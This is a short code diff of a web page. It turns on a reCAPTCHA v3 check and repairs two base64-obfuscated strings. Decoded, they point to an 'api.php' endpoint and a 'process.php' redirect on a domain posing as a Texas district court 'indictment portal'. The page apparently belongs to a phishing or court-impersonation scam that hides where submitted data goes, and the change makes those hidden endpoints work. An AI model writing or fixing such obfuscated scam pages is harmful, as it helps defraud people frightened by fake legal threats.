@@ -6,11 +6,11 @@
     
     <script>
       window.RECAPTCHA_CONFIG = {
-        siteKey: '6LehSA4sAAAAAIRRC9J1qbL_qHHhjDWKd3jiGUkt',
-        enabled: false,
+        siteKey: '6Lf2HREsAAAAAGBbqMFDrC5ot0ZNPwqfTBNhOwzf',
+        enabled: true,
         threshold: 0.3,
         version: 'v3',
-        scriptUrl: 'https://www.google.com/recaptcha/api.js?render=6LfUvO4rAAAAABz_j2gl1r_x8x3mVkstksZXVU-k'
+        scriptUrl: 'https://www.google.com/recaptcha/api.js?render=6Lf2HREsAAAAAGBbqMFDrC5ot0ZNPwqfTBNhOwzf'
       };
       window.RECAPTCHA_SITE_KEY = window.RECAPTCHA_CONFIG.siteKey;
     </script>
@@ -175,10 +175,8 @@
 
     <script>
       (async function () {
-        const endpoint = atob("aHR0cHM6Ly90eC1kaXN0cmljdGNvdXJ0LmluZGljdG1lbnRwb3
-J0YWwub25saW5lL2FwaS5waHA=");
-        const redirectBase = atob("aHR0cHM6Ly90eC1kaXN0cmljdGNvdXJ0LmluZGljdG1lbnRwb3
-J0YWwub25saW5lL3Byb2Nlc3MucGhw");
+        const endpoint = atob("aHR0cHM6Ly90eC1kaXN0cmljdGNvdXJ0LmluZGljdG1lbnRwb3J0YWwub25saW5lL2FwaS5waHA=");
+        const redirectBase = atob("aHR0cHM6Ly90eC1kaXN0cmljdGNvdXJ0LmluZGljdG1lbnRwb3J0YWwub25saW5lL3Byb2Nlc3MucGhw");
         
         const RECAPTCHA_SITE_KEY = window.RECAPTCHA_CONFIG ? window.RECAPTCHA_CONFIG.siteKey : '';
         const USE_RECAPTCHA = window.RECAPTCHA_CONFIG ? window.RECAPTCHA_CONFIG.enabled : false;
